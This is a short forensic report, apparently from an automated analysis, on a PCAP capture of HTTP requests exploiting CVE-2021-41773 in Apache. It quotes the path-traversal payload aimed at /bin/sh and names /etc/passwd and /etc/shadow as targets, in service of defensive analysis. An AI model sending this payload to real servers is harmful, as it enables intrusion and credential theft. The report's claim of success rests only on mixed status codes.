+The analysis of the PCAP file revealed multiple HTTP requests attempting to access sensitive files and execute a shell command on the server. These requests indicate potential exploitation attempts, possibly involving directory traversal and remote code execution. The raw packet data was extracted using the '-x' option, providing a hex and ASCII dump of the packet data, which confirmed the nature of the requests. The requests targeted files such as '/etc/passwd', '/etc/shadow', and attempted to execute '/bin/sh' via a POST request to '/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'. This suggests an attempt to exploit a vulnerability in the server to gain unauthorized access or execute arbitrary commands. The CVE associated with these attempts is CVE-2021-41773, related to the Apache HTTP Server with mod_cgi enabled. The server's responses included a mix of 200, 403, and 404 status codes, indicating that some requests were successful, while others were blocked or not found. This suggests that the server was vulnerable to the attack, and some exploitation attempts were successful.
 REPORT SUMMARY:
 Identified CVE: CVE-2021-41773
 Affected Service: Apache HTTP Server
